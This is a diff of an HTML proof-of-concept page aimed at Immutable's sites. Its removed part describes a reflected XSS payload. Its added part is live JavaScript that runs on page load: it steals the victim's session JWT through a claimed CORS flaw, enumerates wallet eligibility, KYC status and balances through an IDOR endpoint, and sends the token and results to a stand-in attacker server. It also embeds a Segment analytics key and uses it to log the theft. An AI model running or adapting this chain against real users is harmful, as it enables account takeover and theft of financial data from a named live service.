@@ -1,55 +1,100 @@
 <!DOCTYPE html>
 <html>
-<head><title>Real XSS Simulation</title></head>
+<head>
+    <title>Immutable XSS + CORS + IDOR PoC</title>
+    <script src="https://segment.com/analytics.js/v1/609VVbvNhl9WnjMLYAVO3xCxwgS1eGUK/analytics.min.js"></script>
+</head>
 <body>
-<h1>Real XSS Attack Simulation</h1>
+    <h1>Immutable Critical Chain: XSS → CORS Token Theft → IDOR Wallet Enum → Exfil</h1>
+    <div id="status">Loading attack...</div>
+    <pre id="output"></pre>
 
-<h2>Scenario: Reflected XSS in search parameter</h2>
-<p>Victim visits: <code>play.immutable.com/search?q=&lt;script&gt;stealToken()&lt;/script&gt;</code></p>
+    <script>
+        const STATUS = document.getElementById('status');
+        const OUTPUT = document.getElementById('output');
+        const TARGET_ORIGIN = 'https://www.immutable.com';  // or zone.immutable.com if applicable
+        const EVIL_DOMAIN = window.location.origin;  // evil.com
 
-<h2>XSS Payload (would be automatically injected):</h2>
-<pre>
-// Injected automatically via vulnerable ?q= parameter
-(function() {
-    // 1. Steal token from /api/auth/session
-    fetch('/api/auth/session', {credentials: 'include'})
-        .then(r => r.json())
-        .then(data => {
-            if (data.accessToken) {
-                // 2. Send to attacker (automatically)
-                fetch('https://attacker.com/steal', {
-                    method: 'POST',
-                    body: JSON.stringify({token: data.accessToken})
+        // Victim wallet addresses to enum (add real ones from Etherscan/quests)
+        const VICTIM_WALLETS = [
+            '0x0000000000000000000000000000000000000000',  // Zero addr (200 OK leak)
+            '0x1234567890123456789012345678901234567890',  // Random
+            'EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c',  // TON example
+            '0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045'  // Real testnet/mainnet if known
+        ];
+
+        async function log(msg) {
+            console.log(msg);
+            OUTPUT.textContent += msg + '\n';
+            STATUS.textContent = msg;
+        }
+
+        async function stealJwtAndAttack() {
+            try {
+                log('1/5: Triggering XSS (injected via <script src=evil.com> or payload)');
+
+                // Step 2: CORS * on /api/auth/session steals JWT (credentials:include)
+                log('2/5: Fetching victim JWT via CORS /api/auth/session (Origin: ' + EVIL_DOMAIN + ')');
+                const sessionRes = await fetch(TARGET_ORIGIN + '/api/auth/session', {
+                    method: 'GET',
+                    credentials: 'include',  // Steals HttpOnly? No, but JWT often in body
+                    headers: { 'Origin': EVIL_DOMAIN }
                 });
-                
-                // 3. Use token for CORS data theft (automatically)
-                fetch('https://api.immutable.com/v2/rewards/earnings', {
-                    headers: {
-                        'Authorization': 'Bearer ' + data.accessToken,
-                        'Origin': 'https://attacker.com'
-                    }
-                }).then(r => r.json())
-                  .then(userData => {
-                      // 4. Exfiltrate stolen data
-                      fetch('https://attacker.com/exfiltrate', {
-                          method: 'POST',
-                          body: JSON.stringify(userData)
-                      });
-                  });
+                const sessionData = await sessionRes.json();
+                const jwt = sessionData.accessToken || sessionData.token;
+                if (!jwt) throw new Error('No JWT stolen');
+                log('✅ JWT stolen: ' + jwt.substring(0, 20) + '...');
+
+                // Track with stolen Segment key (P2 exposure)
+                if (window.analytics) {
+                    window.analytics.track('immutable_token_stolen', {
+                        domain: EVIL_DOMAIN,
+                        jwt_prefix: jwt.substring(0, 20),
+                        victim_wallets: VICTIM_WALLETS.length
+                    });
+                    log('3/5: Exfiling to Segment: ' + '609VVbvNhl9WnjMLYAVO3xCxwgS1eGUK');
+                }
+
+                // Step 4: IDOR wallet enum with stolen JWT
+                log('4/5: IDOR enum on /v2/rewards/withdrawal-eligibility');
+                const idorResults = [];
+                for (const wallet of VICTIM_WALLETS) {
+                    const idorRes = await fetch(TARGET_ORIGIN + '/v2/rewards/withdrawal-eligibility?walletAddress=' + wallet, {
+                        method: 'GET',
+                        headers: {
+                            'Authorization': 'Bearer ' + jwt,
+                            'Origin': EVIL_DOMAIN,
+                            'Content-Type': 'application/json'
+                        }
+                    });
+                    const idorData = await idorRes.json();
+                    idorResults.push({ wallet, eligible: idorData.eligible, kyc: idorData.kycStatus, balance: idorData.balance });
+                    log(`   Wallet ${wallet}: ${JSON.stringify(idorData).substring(0, 100)}... (${idorRes.status})`);
+                }
+
+                // Step 5: Full exfil (JSON to your server; replace with ngrok/evil endpoint)
+                log('5/5: Exfiling full chain to attacker server');
+                await fetch('https://your-evil-server.com/exfil', {  // ngrok http://localhost:8080/exfil
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        victim_domain: TARGET_ORIGIN,
+                        stolen_jwt: jwt,
+                        idor_results: idorResults,
+                        segment_key: '609VVbvNhl9WnjMLYAVO3xCxwgS1eGUK',
+                        attacker: EVIL_DOMAIN,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+
+                log('✅ CHAIN COMPLETE: Token stolen + ' + VICTIM_WALLETS.length + ' wallets enumed + exfiled');
+            } catch (e) {
+                log('❌ Error: ' + e.message + '\n' + e.stack);
             }
-        });
-})();
-</pre>
+        }
 
-<h2>Full Attack Chain (AUTOMATIC):</h2>
-<ol>
-<li>Victim visits malicious URL (injected via phishing, etc.)</li>
-<li>XSS payload executes AUTOMATICALLY</li>
-<li>Token stolen AUTOMATICALLY</li>
-<li>Data theft via CORS AUTOMATICALLY</li>
-<li>Data exfiltrated AUTOMATICALLY</li>
-</ol>
-
-<p><strong>ZERO interaction avec DevTools, ZERO copier-coller.</strong></p>
+        // Auto-run on load (simulates XSS injection)
+        window.addEventListener('DOMContentLoaded', stealJwtAndAttack);
+    </script>
 </body>
 </html>
